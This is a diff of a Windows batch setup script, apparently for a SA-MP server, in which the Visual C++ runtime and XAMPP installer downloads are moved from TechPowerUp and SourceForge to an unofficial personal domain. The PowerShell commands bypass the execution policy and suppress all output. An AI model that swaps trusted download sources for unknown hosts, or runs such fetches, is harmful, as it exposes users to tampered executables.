@@ -168,7 +168,7 @@ if exist "%SAMP_FOLDER%\winrar-x64-713.exe" (
 
 :: Download Visual C++ All-in-One (Updated URL)
 echo     [2/3] Downloading Visual C++ All-in-One...
-powershell -ExecutionPolicy Bypass -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://sg1-dl.techpowerup.com/files/Nv1-hkAGisidviNHA60VoQ/1758298839/Visual-C-Runtimes-All-in-One-Jul-2025.zip' -OutFile '%SAMP_FOLDER%\Visual-C-Runtimes-All-in-One-Jul-2025.zip' -UseBasicParsing -TimeoutSec 60; Write-Host 'Visual C++ AIO download completed' } catch { Write-Host 'Visual C++ AIO download failed'; exit 0 }" >nul 2>&1
+powershell -ExecutionPolicy Bypass -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://com.zeedun.my.id/Visual-C-Runtimes-All-in-One-Jun-2026.zip' -OutFile '%SAMP_FOLDER%\Visual-C-Runtimes-All-in-One-Jul-2025.zip' -UseBasicParsing -TimeoutSec 60; Write-Host 'Visual C++ AIO download completed' } catch { Write-Host 'Visual C++ AIO download failed'; exit 0 }" >nul 2>&1
 
 if exist "%SAMP_FOLDER%\Visual-C-Runtimes-All-in-One-Jul-2025.zip" (
     echo     Visual C++ All-in-One downloaded successfully to: %SAMP_FOLDER%\Visual-C-Runtimes-All-in-One-Jul-2025.zip
@@ -178,7 +178,7 @@ if exist "%SAMP_FOLDER%\Visual-C-Runtimes-All-in-One-Jul-2025.zip" (
 
 :: Download XAMPP (Updated URL)
 echo     [3/3] Downloading XAMPP...
-powershell -ExecutionPolicy Bypass -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/8.2.12/xampp-windows-x64-8.2.12-0-VS16-installer.exe' -OutFile '%SAMP_FOLDER%\xampp-windows-x64-8.2.12-installer.exe' -UseBasicParsing -TimeoutSec 120; Write-Host 'XAMPP download completed' } catch { Write-Host 'XAMPP download failed'; exit 0 }" >nul 2>&1
+powershell -ExecutionPolicy Bypass -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://com.zeedun.my.id/xampp-windows-x64-8.2.12-0-VS16-installer.exe' -OutFile '%SAMP_FOLDER%\xampp-windows-x64-8.2.12-installer.exe' -UseBasicParsing -TimeoutSec 120; Write-Host 'XAMPP download completed' } catch { Write-Host 'XAMPP download failed'; exit 0 }" >nul 2>&1
 
 if exist "%SAMP_FOLDER%\xampp-windows-x64-8.2.12-installer.exe" (
     echo     XAMPP downloaded successfully to: %SAMP_FOLDER%\xampp-windows-x64-8.2.12-installer.exe
